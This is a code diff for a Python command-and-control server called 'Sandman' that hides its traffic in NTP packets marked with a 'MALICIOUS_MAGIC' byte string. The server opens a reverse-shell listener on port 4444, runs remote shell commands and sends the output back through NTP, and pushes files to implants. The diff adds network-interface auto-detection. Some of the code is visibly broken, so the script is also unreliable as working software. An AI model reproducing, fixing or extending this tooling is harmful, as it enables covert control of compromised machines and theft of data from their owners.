@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Sandman C2 Server
+Sandman C2 Server v8.0 - NTP Edition
 Features:
   - NTP Heartbeat (0x1B + IDOV31)
+  - Auto-Interface Detection (Ubuntu + Windows Compatible)
   - Hardcoded Logic:
     1. Reverse Shell (TCP Port 4444)
     2. File Search (Multi-Threading Background Execution)
@@ -20,13 +21,17 @@ import socket
 import threading
 import subprocess
 import queue
+import ipaddress
+import netifaces
+import psutil
 from tkinter import Tk, filedialog
 from scapy.all import sniff, IP, UDP, NTP
 
 # === CONFIGURATION ===
-INTERFACE = "eth0"
-SERVER_HOST = "192.168.230.1"  # Client expects to connect to this IP
-SERVER_IP = "192.168.230.1"    # Server actually responds from this IP (or spoofed)
+TARGET_RANGE = "10.10.10.0/24"  # Auto-detect range (e.g., "192.168.230.0/24")
+INTERFACE = "eth0"              # Fallback (if no range found)
+SERVER_HOST = "192.168.230.1"   # Client expects to connect to this IP
+SERVER_IP = "192.168.230.1"     # Server responds from this IP (or spoofed)
 NTP_PORT = 123
 SLEEP = 0.1
 CHUNK_SIZE = 48
@@ -34,8 +39,8 @@ MALICIOUS_MAGIC = b"IDOV31"
 MAGIC_BYTE = 0x1B
 
 # === HARDWARE SOCKETS (Global) ===
-tcp_shell_sock = None       # Reverse Shell Socket (Port 4444)
-tcp_upload_sock = None      # Upload Socket (Port 8888)
+tcp_shell_sock = None
+tcp_upload_sock = None
 
 # === THREAD POOL FOR SEARCH ===
 search_queue = queue.Queue()
@@ -73,26 +78,20 @@ def spawn_reverse_shell(ip_source, ip_dest):
     global tcp_shell_sock
     try:
         print(f"[+] Spawning Reverse Shell Listener on {SERVER_HOST}:4444...")
-        
-        # 1. Create TCP Socket
         tcp_shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         tcp_shell_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         tcp_shell_sock.bind((SERVER_HOST, 4444))
         tcp_shell_sock.listen(5)
         print(f"[+] TCP Listener Ready: {SERVER_HOST}:4444")
         
-        # 2. Accept Connection from Client
         conn, addr = tcp_shell_sock.accept()
         print(f"[+] Client Connected: {addr}")
         
-        # 3. Send Acknowledgement via NTP
         ack = pack_ntp_resp(MAGIC_BYTE, b"READY")
         send_udp_packet(ack, ip_source, ip_dest, NTP_PORT)
         
-        # 4. Keep Connection Alive
         while True:
             time.sleep(SLEEP)
-        
     except Exception as e:
         print(f"[-] Reverse Shell Error: {e}")
         return False
@@ -103,26 +102,20 @@ def execute_search(cmd, src_ip, dst_ip, ntp_port):
     """Execute search command (e.g., 'dir C:\\Temp\\*') in a background thread"""
     try:
         print(f"[+] Executing Search: {cmd}")
-        
-        # Parse Command (Example: 'dir C:\\Temp\\*')
         if cmd and cmd.strip() != "CMD":
-            # Run in background thread
             p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
             stdout, stderr = p.communicate()
             
             if stdout:
                 print(f"[+] File Search Result: {len(stdout)} bytes")
-                # Stream chunks back via NTP
                 for i in range(0, len(stdout), CHUNK_SIZE):
                     chunk = stdout[i:i+CHUNK_SIZE]
                     packet = pack_ntp_resp(MAGIC_BYTE, chunk)
                     send_udp_packet(packet, src_ip, dst_ip, ntp_port)
                     time.sleep(SLEEP)
             
-            # End-of-Transmission
             packet = pack_ntp_resp(MAGIC_BYTE, b"END")
             send_udp_packet(packet, src_ip, dst_ip, ntp_port)
-        
     except Exception as e:
         print(f"[-] Search Error: {e}")
 
@@ -131,36 +124,29 @@ def run_file_upload(ip_source, ip_dest, ntp_port=123):
     """Open a TCP Listener for File Upload with GUI Dialog"""
     global tcp_upload_sock
     try:
-        # 1. Create TCP Listener
         tcp_upload_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         tcp_upload_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         tcp_upload_sock.bind(("0.0.0.0", 8888))
         tcp_upload_sock.listen(5)
         print(f"[+] Opening TCP Upload Listener on Port 8888...")
         
-        # 2. Send ACK to Client
         ack = pack_ntp_resp(MAGIC_BYTE, b"LISTENING")
         send_udp_packet(ack, ip_source, ip_dest, ntp_port)
         
-        # 3. Accept File Upload
         conn, addr = tcp_upload_sock.accept()
         print(f"[+] Received Upload Request from {addr}")
         
-        # 4. Open GUI Dialog to Select File
         root = Tk()
-        root.withdraw()  # Hide window (only show dialog)
+        root.withdraw()
         file_path = filedialog.askopenfilename(title="Select File to Upload", initialdir="C:\\")
         root.destroy()
         
         if file_path:
             print(f"[+] Selected File: {file_path}")
-            
-            # 5. Stream File to Client
             buffer = b""
             with open(file_path, "rb") as f:
                 buffer = f.read()
             
-            # 6. Send in Chunks
             for i in range(0, len(buffer), CHUNK_SIZE):
                 chunk = buffer[i:i+CHUNK_SIZE]
                 packet = pack_ntp_resp(MAGIC_BYTE, chunk)
@@ -168,17 +154,13 @@ def run_file_upload(ip_source, ip_dest, ntp_port=123):
                 time.sleep(SLEEP)
             
             print(f"[+] Upload Complete: {len(buffer)} bytes")
-            
-            # 7. End-of-Transmission
             packet = pack_ntp_resp(MAGIC_BYTE, b"END")
             send_udp_packet(packet, ip_source, ip_dest, ntp_port)
-        
         else:
             print("[-] No File Selected")
             packet = pack_ntp_resp(MAGIC_BYTE, b"NO_FILE")
             send_udp_packet(packet, ip_source, ip_dest, ntp_port)
         
-        # 8. Keep Listening
         while True:
             conn, addr = tcp_upload_sock.accept()
             print(f"[+] Received Upload Request from {addr}")
@@ -198,32 +180,69 @@ def run_file_upload(ip_source, ip_dest, ntp_port=123):
                     time.sleep(SLEEP)
                 
                 print(f"[+] Upload Complete: {len(buffer)} bytes")
-                
                 packet = pack_ntp_resp(MAGIC_BYTE, b"END")
                 send_udp_packet(packet, ip_source, ip_dest, ntp_port)
             else:
                 packet = pack_ntp_resp(MAGIC_BYTE, b"NO_FILE")
                 send_udp_packet(packet, ip_source, ip_dest, ntp_port)
-        
     except Exception as e:
         print(f"[-] File Upload Error: {e}")
+
+# === AUTO-INTERFACE DETECTION (Improved for Ubuntu + Windows) ===
+def auto_detect_interface(target_range="10.10.10.0/24", timeout=5):
+    """Scan all interfaces for the one with traffic to the target range"""
+    print(f"[+] Auto-Detecting Interface for Range: {target_range}...")
+    
+    # 1. Get all interfaces from `netifaces` (works on Ubuntu + Windows)
+    interfaces = netifaces.interfaces()
+    
+    print(f"[+] Found {len(interfaces)} interfaces: {', '.join(interfaces)}")
+    
+    # 2. Try each interface with its IP address
+    for iface_name in interfaces:
+        print(f"[+] Checking Interface: {iface_name}...")
+        try:
+            # 3. Get the IP address of the interface
+            addrs = netifaces.ifaddresses(iface_name)
+            if ipaddress.IPv4Address in addrs.get(2, []):
+                ips = [addr['addr'] for addr in addrs[2] if 'addr' in addr]
+                if ips:
+                    ip_address = ips[0]
+                    print(f"[+] Interface IP: {ip_address}")
+                    
+                    # 4. Try to bind socket to the IP (not name)
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.settimeout(2)
+                    sock.bind((ip_address, NTP_PORT))
+                    
+                    # 5. Try to send a packet to the target range
+                    target_ip = next(iter(ipaddress.IPv4Network(target_range)))
+                    sock.sendto(b"test", (target_ip, 123))
+                    
+                    print(f"[+] Found Active Interface: {iface_name} ({ip_address})")
+                    return iface_name
+                    
+        except socket.timeout:
+            continue
+        except Exception as e:
+            continue
+    
+    print(f"[-] No active interface found for {target_range}, using default: {INTERFACE}")
+    return INTERFACE
 
 # === HEARTBEAT HANDLER ===
 def handle_heartbeat(ip_source, ip_dest, raw_data, src_port, dst_port, type_byte, src_type):
     """Process the heartbeat and trigger the appropriate handler"""
     try:
-        # 1. Check Magic & Signature
         raw_bytes = raw_data[:48]
         if len(raw_bytes) < 7:
             return
         
         if raw_bytes[1:7] == MALICIOUS_MAGIC:
-            # 2. Extract Payload Type (Next 6 bytes: Type)
             type_data = raw_bytes[7:13]
             type_str = type_data.decode().strip()
             print(f"[+] Received Type: {type_str}")
             
-            # 3. Determine Action
             if type_str == "ReverseShell":
                 print("[+] Handling ReverseShell...")
                 spawn_reverse_shell(ip_source, ip_dest)
@@ -232,12 +251,9 @@ def handle_heartbeat(ip_source, ip_dest, raw_data, src_port, dst_port, type_byte
                 
             elif type_str == "FileSearch":
                 print("[+] Handling FileSearch...")
-                # Receive Command String from Client
-                cmd = ip_source
-                cmd = cmd[:48]
+                cmd = raw_data[:48]
                 cmd = cmd.decode().strip()
                 
-                # Queue the search command
                 if cmd:
                     search_queue.put((cmd, ip_source, ip_dest, NTP_PORT))
                     ack = pack_ntp_resp(MAGIC_BYTE, b"QUEUED")
@@ -276,7 +292,7 @@ def sniff_loop(interface, filter_str, timeout=5):
     print(f"[+] Starting NTP Sniffer on {interface}...")
     print(f"[+] Filter: {filter_str}")
     
-    start_search_threads()  # Start background thread pool
+    start_search_threads()
     
     while True:
         try:
@@ -285,30 +301,24 @@ def sniff_loop(interface, filter_str, timeout=5):
                 ntp_pkt = packet[0][NTP]
                 ip_pkt = packet[0][IP]
                 
-                # 1. Check NTP Magic Byte
                 raw = scapy.raw(ntp_pkt)
                 if raw[1:7] == MALICIOUS_MAGIC:
-                    # 2. Receive Magic + Type
                     connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     connection.bind((SERVER_HOST, NTP_PORT))
                     
-                    # 3. Receive Payload Type (Next 6 bytes: Type)
                     type_data = connection.recv(6)
                     type_str = type_data.decode().strip()
                     
-                    # 4. Determine Payload
                     payload_cfg = {
                         "ReverseShell": {"Type": "ReverseShell", "Size": 4096, "Data": b"READY"},
                         "FileSearch": {"Type": "FileSearch", "Size": 4096, "Data": b"QUEUED"},
                         "FileUpload": {"Type": "FileUpload", "Size": 4096, "Data": b"LISTENING"}
                     }
                     
-                    # 5. Send Payload Size
                     size = 4096
                     size_chunk = pack_ntp_resp(MAGIC_BYTE, f"{MAGIC_BYTE}{size}".encode())
                     connection.send(size_chunk)
                     
-                    # 6. Send Payload Data (Chunks)
                     content = payload_cfg.get(type_str, payload_cfg["ReverseShell"])["Data"]
                     for i in range(0, len(content), CHUNK_SIZE):
                         chunk = content[i:i+CHUNK_SIZE]
@@ -316,7 +326,6 @@ def sniff_loop(interface, filter_str, timeout=5):
                         connection.send(chunk_pkt)
                         time.sleep(SLEEP)
                     
-                    # 7. Send End-of-Transmission
                     connection.send(pack_ntp_resp(MAGIC_BYTE, b"\x00"))
         
         except Exception as e:
@@ -333,10 +342,15 @@ def print_banner():
   ____) | (_| | | | | (_| | | | | | | (_| | | | |
  |_____/ \__,_|_| |_|\__,_|_| |_| |_|\__,_|_| |_|
         Sandman C2 Server
-     """)
+    """)
 
 if __name__ == "__main__":
     print_banner()
+    
+    # 1. Auto-Detect Interface
+    iface = auto_detect_interface(TARGET_RANGE)
+    print(f"[+] Selected Interface: {iface}")
+    INTERFACE = iface
     
     if len(sys.argv) >= 2:
         INTERFACE = sys.argv[1]
